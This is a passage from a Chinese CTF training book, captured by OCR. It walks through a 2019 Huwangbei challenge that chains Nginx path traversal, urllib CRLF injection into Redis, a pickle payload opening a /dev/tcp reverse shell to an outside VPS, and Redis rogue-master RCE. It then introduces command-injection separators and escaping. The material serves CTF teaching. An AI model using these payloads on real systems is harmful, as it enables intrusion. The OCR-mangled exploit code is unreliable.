从0到1：CTFer成长之路-Nu1L战队-微信读书
攻击结果见图2-1-32
[roote.i1 ~]#nc -vlp 8886
Connection from 54 223.247.98:35820
bosh: no job control in this shell
[roote33b160582bff ~]# 1s
anaconda-ks.cfg
l.s
flog_in_here
deod. letter
install.1og
instal1. 1og-syslog
[roote33b16e582bff ~]# cot flog_in_here
cot flag_in_here
Orz!
This is flog:
SYC{7oef12345e2aa21oe8f97co8b5d9e581]
[roote33b160582bff ~]#
图2-1-32
2.护网杯2019 easy_python
2019年护网杯中有一道SSRF攻击Redis的题目。我们赛后模拟了题目进行复盘，当作实例进行分析。
首先，随意登录，发现存在一个flask的session值，登录后为一个请求的功能，随意对自己的VPS进
行请求，会得到图2-1-33所示的信息。
关键信息是使用了Python3和urlib，查看返回包，可以得到如图2-1-34所示的信息。
4uuu Nya
nc -lvv 1234
GET/ HTTP/1.1
Accept-Encoding:identity
Host: 172.20.10.2:1234
User-Agent: Python-urllib/3.7
Connection: close
图2-1-33
Response Headers
viewsource
Connection:keep-alive
Content-Encoding: gzip
Content-Type:text/html;charset=utf-8
Date:Sun,08Dec 2019 08:53:56GMT
Server:nginx/1.10.3
Transfer-Encoding: chunked
图2-1-34
看到返回包中的Nginx，有经验的参赛者会猜到是Nginx配置错误导致目录穿越的漏洞，而题目虽然
没有开目录遍历，但是仍然可以构造从/static./_pycache_/获取pyc文件。由于不知道文件名，遍
历常用文件名，可以得到main.cpython-37.pyc和views.cpython-37.pyc，见图2-1-35
https:/weread.qq.com/web/reader/77d32500721a485577d8eeekaab325601eaab3238922e53
15/18
---
## Page 85
2021/1/16
从0到1：CTFer成长之路-Nu1L战队-微信读书
图2-1-35
然后对请求功能进行测试，发现不允许请求本机地址，见图2-1-36.
Hello test
请求地址：http:/127.0.0.1
提交
hacked
图2-1-36
Hello test
请求地址：hp:/0
提交
Redirecting.
Tou should be redirect
to target URL: /login/.If not click the link.
图2-1-37
Pyc反编译，得到源码后，可知后端存在一个没有密码的Redis，那么明显需要攻击Redis这里结合
之前得到的信息，猜测使用CVE-2019-9740（Python urllibCRLFinjection）应该可以实现攻击目
的。而这里无法通过常规的攻击方法反弹shell或者直接写webshell，通过阅读flask-session库的代码
可知存入的数据是pickle序列化后的字符串，那么我们可以通过这个CRLF漏洞写入一个恶意的序列化
字符串，再访问页面触发反弹回shell，写入恶意序列化字符串代码如下：
class Expleit():
def init,_,(self, hast, port):
https:/weread.qq.com/web/reader/77d32500721a485577d8eeekaab325601eaab3238922e53
---
## Page 86
2021/1/16
从0到1：CTFer成长之路-Nu1L战队-微信读书
returs ** Jelna(randem.sample(stringascis_1etters, 10))
Lapert randen, string
(as)aredop yop
satf.req-post(seLf.urt • +/togin/', datan(*users
tane* :seLf .rardon_str()))
kesx1Vsystev11x00x111x1x00ash e 11*sa1x6 /dev/t/
Legx\1e
172.20.09.3/1234 061111x0111x85/11x2Ae1103. */2/
res * self.roq-post(self.url + */request/, data[
url:*http:// + paylosd2 **233/*
1)
print(res.centent)
exp = Exploit(sys
exp.doxplait()
1.argv[1], sys-argv[2]]
ect te [1.3.] 
41s-a/1g
rl
15 bec 1 I0:38 ani
127.4.8.1:817
图2-1-38
拿到shell后，信息搜集发现，Redis是使用root权限启动的，但写SSH私钥和webshell等不太现实
于是考虑可以利用Redis的主从模式（在2019年的WCTF2019Final上，LC&BC战队成员在赛后分享
上介绍了由于redis的主从复制而导致的新的RCE利用方式）去RCE读flag。
这里介绍Redis的主从模式。Redis为了应对读写量较大的问题，提供了一种主从模式，使用一个。
实例作为主机只负责写，其余实例都为从机，只负责读，主从机间数据相同，其次在Redis4.x后新
Redis
增加了模块的功能，通过外部的扩展可以实现一条新的Redis命令，因为此时已经完全控制了Redis，
所以可以通过将此机没置为自己VPS的从机，在主机上通过FULLSYNC同步备份一个恶意扩展到从机
上加载。在Github上可以搜到关于该攻击的exp，如https://github.com/nobOdyCN/redis-rogue-
server
这里因为触发点的原因，不能完全使用上述exp提供的流程去运行。
先在shell中设置为VPS的从机，再设置dbfilename为exp.so，手动执行完exp中的前两步，见图2-1
39.
图]2-1-39
然后去掉加载模块后面的所有功能，在VPS上运行exp。最后在Redis上手动执行剩下的步骤，使用扩
展提供的功能读取flag即可，见图2-1-40.
127.8.8.1:6379) systeaecid
127.0.8.1:537
图2-1-40
https:/weread.qq.com/web/reader77d32500721a485577d8eeekaab325601eaab3238922e53
1//18
---
## Page 87
2021/1/16
从0到1：CTFer成长之路-Nu1L战队-微信读书
2.2命令执行漏洞
通常情况下，在开发者使用一些执行命令函数且未对用户输入的数据进行安全检查时，可以注入恶意
的命令，使整台服务器处于危险中。作为一名CTFer，命令执行的用途如下：③技巧型直接获取
：②进行反弹Shell，然后进入内网的大门：③利用出题人对权限的控制不严格，对题目环填拥有控
制权，导致其他队伍选手无法解题，这样在时间上会占一定优势。
在CTF中，命令执行一般发生在远程，故被称为远程命令执行，即RCE（RemoteCommand
），也被称为RCE（RemoteCodeExec）。本节的RCE皆为远程命令执行。
本节将阐述常见的RCE漏洞和绕过WAF的方案，再通过一些经典题目让读者对CTF中的RCE题目有所
了解。
2.2.1命令执行的原理和测试方法
下面介绍命令注入的基本原理，包括cmdexe、bash程序在解析命令的时候会存在哪些问题、在不同
的操作系统中执行命令会存在哪些异同点等，以及在CTF题目中应该如何进行测试，直到最终获取
1
2.2.1.1命令执行原理
在各类编程语言中，为了方便程序处理，通常会存在各种执行外部程序的函数，当调用函数执行命令
且未对输入做过滤时，通过注入恶意命令，会造成巨大的危害。
下面以PHP中的system0函数举例：
该代码的正常功能是调用操作系统的echo程序，将从d参数接收的字符申作为echo程序的输入，最终
system0函数将echo程序执行的结果返回在网页中，其在操作系统执行的命令为“echofor
，最终在网页显示为“fortest”，见图2-2-1。
tes
图2-2-1
当改变d参数为“fortest%26%26whoami”时。网页会多出whoami程序的执行结果，这是因为
当前在系统执行的命令为°echofortest&&whoami”，见图2-2-2.
图2-2-2
通常为了解决URL中的歧义表达，会将一些特殊字符进行URL编码，“%26”便是“&”的URL编
码。为什么注入“&&”字将就可以造成命令注入呢？类似的还有其他什么字符吗？
在各类编程语言中，“&&是and语法的表达，一般通过如下格式进行调用：
当两边的表达式都为真时，才会返回真。类似的语法还有or，通常用“1l”表示。注意，它们存在情
https://weread.qq.com/web/reader/77d32500721a485577d8eeek9bf32f301f9bf31c7f0a60
---
## Page 88
2021/1/16
从0到1：CTFer成长之路-Nu1L战队-微信读书
法类比，若第一个表达式为真，则第二个表达式也不会执行，因为它恒为真。
所以，命令注入就是通过注入一些特殊字符，改变原本的执行意图，从而执行攻击者指定的命令。
2.2.1.2命令执行基础
在测试前，我们需要了解cmd.exe、bash程序在解析命令时的规则，掌握Windows、Linux的异同
点
1.转义字符
系统中的cmd.exe，bash程序执行命令能够解析很多特殊字符，它们的存在让BAT批处理和bash脚本
处理工作更加便捷，但是如果想去掉特殊字符的特殊意义，就需要进行转义，所以转义字符即为取消
字符的特殊意义。
Windows的转义字符为A”，Linux的转义字符为，分别见图2-2-3和图2-2-4。可以看到。原
本存在特殊意义的“&”被取消意义，从而在终端中输出。
osC:\Windows\system32\cmd.exe
c:\>echo 111&& echo222
1.11
222
c:\>echo111~&~&echo222
111 && echo 222
C:V>
C:V>
C:V>
图2-2-3
gtnt/tmp
111 88 echo 222
111gtesth/t22
echo 111 (8\4 echo 222
test:/tsp# 
图2-2-4
2.多条命令执行
在命令注入中通常需要注入多条命令来扩大危害，下面是一些能够构成多条命令执行的字符串：
下，&&、Il、%0a;Linux下，&&、lI;、$0、“、%0a、%0d,图2-2-5、图2-2-6分别为
Vir
Windows和Linux下的多条命令执行。图2-2-5中显示了“noexistllechopwnpwnpwn
程序本身不存在，所以报错，但是通过注入“1r字符，即使前面报错，还会执行后面的“echo
noexis
“命令。
pw
在上面的例子中，“&&”和“利用条件执进行多条命令执行，“%0a和“%0d”则是由于换
行而可以执行新的命令。另外，在Linux中需要注意，双引号包惠的字符串“$0”或“中的内容
被当作命令执行，但是单引号包括的字符串就是纯字符串，不会进行任何解析，见图2-2-7.
https://weread.q.com/web/reader/77d32500721a485577d8eeek9bf32f301f9bf31c7ff0a60
DUZ
---
## Page 89
2021/1/16
从0到1：CTFer成长之路-Nu1L战队-微信读书
图2-2-5
文件（F）编辑（日查看（V）搜索（S）终端（T）帮助（H）
oot@test:/tnp# echo 111 8s echo 222
111
222
oot@test:/tnp# echo 111;echo 222
111
222
图2-2-6
utd=e（root)gtd=θ（root)组=o（root)
utd=o（root）gtd=o（root）组=o（root）
root@test:/tnp# echo
..P1..
oot@test:/tnp#
Ld
图2-2-7
3.注释符号
与代码注释一样，当合理利用时，命令执行能够使命令后面的其他字符成为注释内容，这样可以降低
程序执行的错误。
Windows的注释符号为“：”，在BAT批处理脚本中用得较多；Linux的注释符号为“#”，在bash
脚本中用得较多，
2.2.1.3命令执行的基本测试
在面对未知的命令注入时，最好通过各种Fuzz来确认命令注入点和黑名单规则。一般命令的格式如
下：
下面以ping-nc1www.baidu.com为例构建Fuzz列表。